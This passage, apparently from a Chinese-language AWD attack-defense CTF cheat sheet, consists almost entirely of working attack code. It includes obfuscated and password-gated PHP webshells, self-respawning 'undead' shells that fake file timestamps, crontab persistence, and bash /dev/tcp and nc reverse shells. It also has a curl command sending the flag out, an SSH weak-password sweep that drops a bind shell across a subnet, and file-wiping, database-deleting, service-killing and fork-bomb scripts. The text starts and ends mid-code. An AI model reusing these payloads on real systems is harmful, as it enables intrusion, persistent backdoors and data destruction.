class="hljs-number">2</span>])&#125;[<span class="hljs-string">&#x27;n985de9&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s22</span>))&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$s21</span>(<span class="hljs-variable">$s22</span>));&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>配置填n985de9&#x3D;QGV2YWwoJF9QT1NUWzBdKTs&#x3D;<br>连接密码:0（零）</p><p>shell4：MD5木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])==<span class="hljs-string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>shell5：MD5木马+利用header<br>2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])==<span class="hljs-string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)<br><span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br><span class="hljs-variable">$test</span>= <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;flag:<span class="hljs-subst">$test</span>&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>不死马示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#x27;</span>cmd<span class="hljs-string">&#x27;]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#passwd=y0range857</span><br><span class="hljs-comment">#POST传参：passwd=y0range857&amp;a=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure><p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入<a href="http://xxx/shell2.php?pass=pass%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82">http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。</a></p><p>写入shell， at.php内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.login.php&#x27;</span>;<br><span class="hljs-variable">$file1</span> = <span class="hljs-string">&#x27;/admin/.register.php&#x27;</span>; <br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file1</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>浏览器访问at.php，会生成不死马at2.php</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">url/upload/<span class="hljs-keyword">at</span>.php<br></code></pre></td></tr></table></figure><p>再传入，执行命令，getshell</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">url/upload/at2.php?passwd=obse007<span class="hljs-variable">&amp;at</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。<br><strong>crontab定时任务</strong><br>1.使用定时任务写马</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">system(&#x27;echo <span class="hljs-string">&quot;* * * * * echo <span class="hljs-subst">\&quot;</span>&lt;?php  if(md5(<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span><span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>\$_POST[pass])==<span class="hljs-subst">\&#x27;</span>462d4a0e7cedd6b024a4d99f10c614d1<span class="hljs-subst">\&#x27;</span>)&#123;@eval(<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span><span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>\$_POST[1]);&#125;  <span class="hljs-subst">\&quot;</span> &gt; /var/www/html/.index.php<span class="hljs-subst">\n</span>* * * * * chmod 777 /var/www/html/.index.php&quot;</span> <span class="hljs-operator">|</span> crontab;whoami&#x27;);<br></code></pre></td></tr></table></figure><p>密码：atkx<br>来指定用户运行指定的定时任务</p><p>2.使用定时任务发送带有flag的请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash<span class="hljs-comment"># 编辑 crontab：crontab -e</span><br>*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d <span class="hljs-string">&#x27;flag=&#x27;</span>$(<span class="hljs-built_in">cat</span> /home/web/flag/flag)<span class="hljs-string">&#x27;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#x27;</span><br><span class="hljs-comment"># 查询 crontab：crontab -l</span><br></code></pre></td></tr></table></figure><p>3.使用定时任务反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -c bash&#x27;bash -i &gt;&amp; /dev/tcp/[ip]/[port] <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;<br><br><span class="hljs-attribute">nc</span> -e /bin/bash <span class="hljs-number">1.3.3.7</span> <span class="hljs-number">4444</span> bash<br></code></pre></td></tr></table></figure><p><strong>反弹shell</strong><br>nc反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.182.130</span>/<span class="hljs-number">6666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>本地</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>软连接语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ln -s  <span class="hljs-selector-attr">[shell路径]</span>   <span class="hljs-selector-attr">[新文件路径]</span><br></code></pre></td></tr></table></figure><p>使用方法：<br>访问&#x2F;upload&#x2F;new.php，实际上是访问&#x2F;upload&#x2F;shell.php</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">ln -s  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>upload<span class="hljs-regexp">/shell.php     /</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/upload/</span><span class="hljs-keyword">new</span>.php<br></code></pre></td></tr></table></figure><p>软连接利用</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">root<span class="hljs-title">@086</span>f<span class="hljs-number">12</span><span class="hljs-keyword">c</span><span class="hljs-number">38</span>b<span class="hljs-number">93</span>:~# ln -s /flag /var/www/html/css/flag.css<br>root<span class="hljs-title">@086</span>f<span class="hljs-number">12</span><span class="hljs-keyword">c</span><span class="hljs-number">38</span>b<span class="hljs-number">93</span>:~# cat /var/www/html/css/flag.css<br>SL&#123;<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">719</span>b<span class="hljs-number">9</span>fb<span class="hljs-number">980</span>dca<span class="hljs-number">71080</span>b<span class="hljs-number">9</span>d<span class="hljs-number">96</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>aa<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">16</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>然后访问url&#x2F;css&#x2F;flag.css即可得到flag</p><h2 id="SSH弱密码利用"><a href="#SSH弱密码利用" class="headerlink" title="SSH弱密码利用"></a>SSH弱密码利用</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>import paramiko<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>= <span class="hljs-string">&#x27;192.168.1.137&#x27;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>= <span class="hljs-string">&#x27;22&#x27;</span><br>username = <span class="hljs-string">&#x27;root&#x27;</span><br>passwd = <span class="hljs-string">&#x27;123456&#x27;</span><br><span class="hljs-comment"># ssh 用户名 密码 登陆</span><br>def ssh_base_pwd(ip,port,username,passwd,<span class="hljs-attribute">cmd</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>):<br>   <span class="hljs-built_in"> port </span>= int(port)<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    ssh.connect(<span class="hljs-attribute">hostname</span>=ip, <span class="hljs-attribute">port</span>=port, <span class="hljs-attribute">username</span>=username, <span class="hljs-attribute">password</span>=passwd)<br>    stdin,stdout,stderr = ssh.exec_command(cmd)<br>    result = stdout.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无结果!&quot;</span>)<br>        result = stderr.read()<br>    ssh.close()<br>    return result.decode()<br>a = ssh_base_pwd(ip,port,username,passwd)<br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment">#SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</span><br></code></pre></td></tr></table></figure><p>批量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>import paramiko<br>import threading<br>import<span class="hljs-built_in"> queue</span><br><span class="hljs-built_in"></span>import time<br><span class="hljs-comment">#反弹shell python</span><br><span class="hljs-attribute">q</span>=queue.Queue()<br><span class="hljs-comment">#lock = threading.Lock()</span><br><br><span class="hljs-comment"># ssh 用户名 密码 登陆</span><br>def ssh_base_pwd(ip,port,username,passwd,cmd):<br>   <span class="hljs-built_in"> port </span>= int(port)<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    ssh.connect(<span class="hljs-attribute">hostname</span>=ip, <span class="hljs-attribute">port</span>=port, <span class="hljs-attribute">username</span>=username, <span class="hljs-attribute">password</span>=passwd)<br>    stdin,stdout,stderr = ssh.exec_command(cmd)<br>    result = stdout.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result :<br>        result = stderr.read()<br>    ssh.close()<br>    return result.decode()<br><br>def main(x):<br>    shell = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">    #服务器端</span><br><span class="hljs-string">    import socket</span><br><span class="hljs-string">    import os</span><br><span class="hljs-string">    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="hljs-string">    s.bind((&#x27;</span>0.0.0.0<span class="hljs-string">&#x27;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接</span><br><span class="hljs-string">    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量</span><br><span class="hljs-string">    con,addr=s.accept()     #接受一个客户端的连接</span><br><span class="hljs-string">    #print(con,addr)</span><br><span class="hljs-string">    for i in range(10):</span><br><span class="hljs-string">        cmd=con.recv(1024)</span><br><span class="hljs-string">        print(cmd)</span><br><span class="hljs-string">        command=cmd.decode()</span><br><span class="hljs-string">        if command.startswith(&#x27;</span>cd<span class="hljs-string">&#x27;):</span><br><span class="hljs-string">            os.chdir(command[2:].strip())   #切换路径</span><br><span class="hljs-string">            result=os.getcwd()      #显示路径</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            result=os.popen(command).read()</span><br><span class="hljs-string">        if result:</span><br><span class="hljs-string">            con.send(result.encode())</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            con.send(b&#x27;</span>OK!<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    &#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>    cmd = <span class="hljs-string">&#x27;echo \&quot;%s\&quot; &gt; ./shell.py&#x27;</span> % (shell) +<span class="hljs-string">&#x27;&amp;&amp; python3 ./shell.py&#x27;</span><br>   <span class="hljs-built_in"> port </span>= <span class="hljs-string">&#x27;22&#x27;</span><br>    username = <span class="hljs-string">&#x27;root&#x27;</span><br>    passwd = <span class="hljs-string">&#x27;toor&#x27;</span><br><br>   <span class="hljs-built_in"> ip </span>= <span class="hljs-string">&#x27;192.168.1.&#123;&#125;&#x27;</span>.format(x)<br>    q.put(ip.strip(),<span class="hljs-attribute">block</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">timeout</span>=None)<br>    <span class="hljs-attribute">ip_demo</span>=q.get()<br>    #判断是否成功<br>    try:<br>        #lock.acquire()<br>        res = ssh_base_pwd(ip_demo,port,username,passwd,<span class="hljs-attribute">cmd</span>=<span class="hljs-string">&#x27;id&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ + ]Ip: %s&quot;</span> % ip_demo +<span class="hljs-string">&quot; is success!!! [ + ]&quot;</span>)<br>            #lock.release()<br>            ssh_base_pwd(ip_demo,port,username,passwd,cmd)<br>    except:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ - ]Ip: %s&quot;</span> % ip_demo +<span class="hljs-string">&quot; is Failed&quot;</span>)<br>    <span class="hljs-keyword">if</span> x &gt; 255:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Finshed!!!!!!!!&quot;</span>)<br>    q.task_done()<br><br><span class="hljs-comment">#线程队列部分</span><br>th=[]<br><span class="hljs-attribute">th_num</span>=255<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(th_num):<br>        <span class="hljs-attribute">t</span>=threading.Thread(target=main,args=(x,))<br>        th.append(t)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(th_num):<br>        th[x].start()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(th_num):<br>        th[x].join()<br><br><span class="hljs-comment">#q.join()所有任务完成</span><br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="攻击搅屎"><a href="#攻击搅屎" class="headerlink" title="攻击搅屎"></a>攻击搅屎</h2><p>无限复制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">randstr</span>().<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_content</span>(<span class="hljs-keyword">__FILE__</span>));<br>      <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>修改数据库密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> authentication_string=<span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">&#x27;p4rr0t&#x27;</span>);# 修改所有用户密码<br>flush <span class="hljs-keyword">privileges</span>;<br><span class="hljs-keyword">UPDATE</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">User</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaa&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span>; <br>flush <span class="hljs-keyword">privileges</span>;<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span> ;#删除所有用户<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure><p>重启 apache2 和 nigix</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env sh</span><br><span class="hljs-keyword">while</span> [[ 1 ]]<br><span class="hljs-keyword">do</span><br>    service apache2 stop<br>    service nginx stop<br><span class="hljs-keyword">done</span> &amp;<br></code></pre></td></tr></table></figure><p>循环删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfiles</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$path</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$afile</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$afile</span>))<br>                <span class="hljs-title function_ invoke__">getfiles</span>(<span class="hljs-variable">$afile</span>.<span class="hljs-string">&#x27;/*.php&#x27;</span>);<br>            <span class="hljs-keyword">else</span><br>                @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$afile</span>,<span class="hljs-string">&quot;#Anything#&quot;</span>);<br>                <span class="hljs-comment">//unlink($afile);</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">getfiles</span>(<span class="hljs-keyword">__DIR__</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">10</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;unlink&#x27;</span>, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;some/dir/*.php&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>删除数据库</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/env python3</span><br>  import base64<br>  def rm_db(db_user,my_db_passwd):<br>      cmd = <span class="hljs-string">&quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;</span>%(db_user,my_db_passwd)<br>      db_name = [<span class="hljs-string">&#x27;performance_schema&#x27;</span>,<span class="hljs-string">&#x27;mysql&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>]<br>      <span class="hljs-keyword">for</span> db in db_name:<br>          cmd += <span class="hljs-string">&quot;drop database %s;&quot;</span>%db<br>      cmd += <span class="hljs-string">&quot;&#x27;&quot;</span><br>      <span class="hljs-keyword">return</span> cmd<br></code></pre></td></tr></table></figure><p>fork_bomb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>/bin/echo <span class="hljs-string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure><p>DOS脚本（非必要最好不要用）</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 